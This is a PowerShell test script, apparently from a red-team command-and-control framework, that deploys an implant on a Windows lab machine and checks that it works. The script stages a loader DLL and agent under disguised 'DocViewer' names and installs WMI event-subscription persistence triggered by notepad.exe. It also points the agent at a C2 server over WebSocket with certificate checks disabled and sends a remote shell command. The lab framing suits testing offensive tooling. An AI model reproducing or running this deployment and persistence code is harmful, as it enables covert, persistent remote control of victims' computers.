# WMI live: stage loader+agent → install subscription → notepad trigger → wait C2 agent → uninstall
# Run elevated on Windows lab VM after c2server is reachable.
#
#   $env:C2_HOST = "<kali-ip>"
#   $env:ADMIN_TOKEN = "lab-admin-token-change-me"
#   $env:AGENT_TOKEN = "lab-agent-token-change-me"
#   $env:C2_PSK = "lab-psk-change-me"
#   .\scripts\wmi_live_test.ps1

param(
    [string]$C2Host = $(if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }),
    [int]$C2Port = $(if ($env:C2_PORT) { [int]$env:C2_PORT } else { 8443 }),
    [string]$AdminToken = $(if ($env:ADMIN_TOKEN) { $env:ADMIN_TOKEN } else { "lab-admin-token-change-me" }),
    [string]$AgentToken = $(if ($env:AGENT_TOKEN) { $env:AGENT_TOKEN } else { "lab-agent-token-change-me" }),
    [string]$Psk = $(if ($env:C2_PSK) { $env:C2_PSK } else { "lab-psk-change-me" }),
    [string]$PayloadDir = $(if ($env:PAYLOAD_DIR) { $env:PAYLOAD_DIR } else { "C:\ProgramData\DocViewer" }),
    [int]$WaitSec = 60,
    [int]$ProtectPid = -1,
    [switch]$KeepInstalled
)

# Processes we must NEVER kill: the driving C2 agent that launched this test.
# When driven through an agent shell_admin (schtasks/elevated), the cleanup
# `Stop-Process -Name agent*` would kill our own transport and cut the channel.
# We capture any process holding an ESTABLISHED connection to the C2 server port
# at start (the driving agent's long-lived WSS), plus $ProtectPid override + $PID.
function Get-C2ProtectedPids {
    $p = [System.Collections.Generic.HashSet[int]]::new()
    $null = $p.Add([int]$PID)
    if ($ProtectPid -gt 0) { $null = $p.Add($ProtectPid) }
    try {
        $conns = Get-NetTCPConnection -RemotePort $C2Port -State Established -ErrorAction SilentlyContinue
        foreach ($c in $conns) { if ($c.OwningProcess -gt 0) { $null = $p.Add($c.OwningProcess) } }
    } catch {}
    return $p
}

function Stop-C2Targets {
    param([string[]]$Names)
    $protect = Get-C2ProtectedPids
    Get-Process -Name $Names -ErrorAction SilentlyContinue |
        Where-Object { -not $protect.Contains($_.Id) -and $_.Id -ne $PID } |
        Stop-Process -Force -ErrorAction SilentlyContinue
}

$ErrorActionPreference = "Stop"

# PS 5.1 safe cert-ignore: compiled ICertificatePolicy delegate.
# Scriptblock callback { $true } crashes on PS 5.1 (no Runspace on cert-callback thread)
# -> "connection closed / unexpected error on send". See scripts/smoke_windows.ps1.
function Set-C2IgnoreCert {
    try {
        if (-not ([System.Management.Automation.PSTypeName]'C2TrustAll').Type) {
            Add-Type -TypeDefinition @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class C2TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
        }
        [System.Net.ServicePointManager]::CertificatePolicy = New-Object C2TrustAll
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
    } catch {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }
}
Set-C2IgnoreCert
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Root = Split-Path -Parent $ScriptDir
$Pass = 0; $Fail = 0
$Results = @()

function Ok($m)  { Write-Host "[+] $m" -ForegroundColor Green; $script:Pass++; $script:Results += "PASS  $m" }
function Bad($m) { Write-Host "[-] $m" -ForegroundColor Red;   $script:Fail++; $script:Results += "FAIL  $m" }
function Step($m){ Write-Host "[*] $m" -ForegroundColor Cyan }

function Invoke-Admin {
    param([string]$Method = "GET", [string]$Path, [hashtable]$Body = $null)
    $url = "https://${C2Host}:${C2Port}$Path"
    $headers = @{ "X-Auth-Token" = $AdminToken }
    if ($null -ne $Body) {
        $json = $Body | ConvertTo-Json -Compress -Depth 8
        return Invoke-RestMethod -Uri $url -Method $Method -Headers $headers -Body $json -ContentType "application/json"
    }
    return Invoke-RestMethod -Uri $url -Method $Method -Headers $headers
}

# admin?
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).
    IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { throw "Administrator PowerShell required for WMI live test" }

$loader = Join-Path $Root "bin\loader.dll"
$agent  = Join-Path $Root "bin\agent.exe"
if (-not (Test-Path $agent)) { $agent = Join-Path $Root "bin\agent_win_amd64" }
$wmi    = Join-Path $Root "bin\persistence\wmi_install.ps1"
if (-not (Test-Path $wmi)) { $wmi = Join-Path $Root "persistence\wmi_install.ps1" }

if (-not (Test-Path $loader)) { throw "missing $loader" }
if (-not (Test-Path $agent))  { throw "missing agent.exe" }
if (-not (Test-Path $wmi))    { throw "missing wmi_install.ps1" }

try {
    $h = Invoke-Admin -Path "/health"
    Ok "health ok ver=$($h.version)$($h.server_ver)"
} catch {
    Bad "health failed: $_"
    throw
}

# snapshot agents before
$beforeIds = @()
try {
    $resp = Invoke-Admin -Path "/admin/agents"
    $list = @(); if ($resp.agents) { $list = @($resp.agents) } else { $list = @($resp) }
    foreach ($a in $list) {
        $id = $a.agent_id; if (-not $id) { $id = $a.id }
        if ($id) { $beforeIds += $id }
    }
} catch {}

Step "stage payload dir $PayloadDir"
New-Item -ItemType Directory -Path $PayloadDir -Force | Out-Null
Copy-Item $loader (Join-Path $PayloadDir "DocViewerCore.dll") -Force
Copy-Item $agent  (Join-Path $PayloadDir "DocViewerHelper.exe") -Force
Ok "staged DocViewerCore.dll + DocViewerHelper.exe"

# Inject C2 env for child processes spawned via WinExec from loader
# (loader/agent read process environment — set Machine-level lab vars only for this test user session)
$env:C2_AUTH_TOKEN = $AgentToken
$env:AGENT_TOKEN   = $AgentToken
$env:C2_PSK        = $Psk
$env:C2_CRYPTO     = "1"
$env:C2_TRANSPORT  = "wss"
$env:C2_SERVER     = "wss://${C2Host}:${C2Port}/socket/v1"
$env:C2_INTERVAL   = "5"
$env:AGENT_WS_PATH = "/socket/v1"
$env:PAYLOAD_PATH  = Join-Path $PayloadDir "DocViewerCore.dll"
$env:TARGET_PROC   = "notepad.exe"

# Persist env for processes that do not inherit this shell (best-effort user env)
$envTargets = @{
    "C2_AUTH_TOKEN" = $AgentToken
    "C2_PSK"        = $Psk
    "C2_CRYPTO"     = "1"
    "C2_TRANSPORT"  = "wss"
    "C2_SERVER"     = "wss://${C2Host}:${C2Port}/socket/v1"
    "C2_INTERVAL"   = "5"
    "AGENT_WS_PATH" = "/socket/v1"
}
foreach ($k in $envTargets.Keys) {
    [Environment]::SetEnvironmentVariable($k, $envTargets[$k], "User")
}
Ok "user env seeded for helper callback"

Step "WMI install"
& powershell -NoProfile -ExecutionPolicy Bypass -File $wmi -Action install -PayloadPath $env:PAYLOAD_PATH -TargetProcess "notepad.exe" | Out-Host
& powershell -NoProfile -ExecutionPolicy Bypass -File $wmi -Action status  | Out-Host
$f = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='DocViewerUpdateEvent'" -ErrorAction SilentlyContinue
if ($f) { Ok "WMI filter present" } else { Bad "WMI filter missing"; throw "filter missing" }

# Kill leftover helpers (never the driving C2 agent — protected by port conn)
Stop-C2Targets -Names @("DocViewerHelper","agent","agent_win_amd64","notepad")
Start-Sleep -Seconds 1

Step "trigger notepad.exe"
Start-Process notepad.exe | Out-Null
Start-Sleep -Seconds 10
Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# Also try direct rundll32 if WMI lag
$dll = Join-Path $PayloadDir "DocViewerCore.dll"
Step "direct rundll32 fallback smoke"
Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dll`",EntryPoint" -WindowStyle Hidden
Start-Sleep -Seconds 5

$helper = Get-Process -Name "DocViewerHelper" -ErrorAction SilentlyContinue
if ($helper) { Ok "DocViewerHelper process running pid=$($helper.Id)" }
else {
    # loader may spawn agent.exe name
    $ag = Get-Process -Name "agent","agent_win_amd64" -ErrorAction SilentlyContinue
    if ($ag) { Ok "agent process running name=$($ag.Name)" }
    else { Bad "no helper/agent process after trigger (check EntryPoint / path)" }
}

Step "wait for C2 registration (up to ${WaitSec}s)"
$deadline = (Get-Date).AddSeconds($WaitSec)
$found = $null
while ((Get-Date) -lt $deadline) {
    try {
        $resp = Invoke-Admin -Path "/admin/agents"
        $list = @(); if ($resp.agents) { $list = @($resp.agents) } else { $list = @($resp) }
        foreach ($a in $list) {
            $id = $a.agent_id; if (-not $id) { $id = $a.id }
            $os = "$($a.os)"
            if ($beforeIds -contains $id) { continue }
            if ($os -match "windows" -or $id) { $found = $a; break }
        }
        if (-not $found) {
            foreach ($a in $list) {
                $os = "$($a.os)"
                if ($os -match "windows") { $found = $a; break }
            }
        }
        if ($found) { break }
    } catch {}
    Start-Sleep -Seconds 2
}

if ($found) {
    $aid = $found.agent_id; if (-not $aid) { $aid = $found.id }
    Ok "agent online id=$aid os=$($found.os) transport=$($found.transport)"
    try {
        $cmd = Invoke-Admin -Method POST -Path "/admin/cmd" -Body @{
            agent_id = $aid
            cmd_type = "shell"
            payload  = "echo wmi-live-ok & whoami"
        }
        $cid = $cmd.id; if (-not $cid) { $cid = $cmd.command_id }
        # Poll the job until done/failed instead of a single short sleep —
        # server flushes queued jobs on the agent's next heartbeat (~5s interval),
        # so an 8s one-shot can miss the result.
        $hit = $false
        $jobDeadline = (Get-Date).AddSeconds([Math]::Max(20, $WaitSec))
        while ((Get-Date) -lt $jobDeadline -and -not $hit) {
            $jobs = Invoke-Admin -Path "/admin/jobs"
            $jlist = @(); if ($jobs.jobs) { $jlist = @($jobs.jobs) } else { $jlist = @($jobs) }
            foreach ($j in $jlist) {
                $id = $j.id; if (-not $id) { $id = $j.command_id }
                if ($id -ne $cid) { continue }
                $data = "$($j.result)$($j.data)$($j.output)"
                if ($data -match "wmi-live-ok") { $hit = $true; Ok "shell via WMI-spawned agent ok" }
                elseif ($j.status -in @("done","failed","error")) { Bad "shell unexpected: $data" }
            }
            if (-not $hit) { Start-Sleep -Seconds 3 }
        }
        if (-not $hit -and -not $cid) { Bad "shell enqueue failed" }
        elseif (-not $hit) { Bad "shell job not confirmed for $cid" }
    } catch {
        Bad "shell after WMI failed: $_"
    }
} else {
    Bad "no windows agent registered after WMI/rundll32 — check User env C2_* and loader WinExec path"
}

if (-not $KeepInstalled) {
    Step "cleanup WMI + processes"
    & powershell -NoProfile -ExecutionPolicy Bypass -File $wmi -Action uninstall | Out-Host
    Stop-C2Targets -Names @("DocViewerHelper","agent","agent_win_amd64","notepad")
    $f2 = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='DocViewerUpdateEvent'" -ErrorAction SilentlyContinue
    if (-not $f2) { Ok "WMI uninstall clean" } else { Bad "WMI filter still present" }
    foreach ($k in $envTargets.Keys) {
        [Environment]::SetEnvironmentVariable($k, $null, "User")
    }
    Ok "cleared user C2_* env"
} else {
    Step "KeepInstalled set — leaving WMI and env in place"
}

Write-Host ""
Write-Host "==== WMI LIVE SUMMARY ====" -ForegroundColor Yellow
$Results | ForEach-Object { Write-Host $_ }
Write-Host "passed=$Pass failed=$Fail"
$outDir = Join-Path $Root "data"
New-Item -ItemType Directory -Path $outDir -Force | Out-Null
$md = @("# WMI live result", "", "host=$C2Host time=$(Get-Date -Format o)", "", "passed=$Pass failed=$Fail", "") + ($Results | ForEach-Object { "- $_" })
$md -join "`n" | Set-Content -Path (Join-Path $outDir "wmi_live_last.md") -Encoding UTF8
if ($Fail -gt 0) { exit 1 } else { exit 0 }
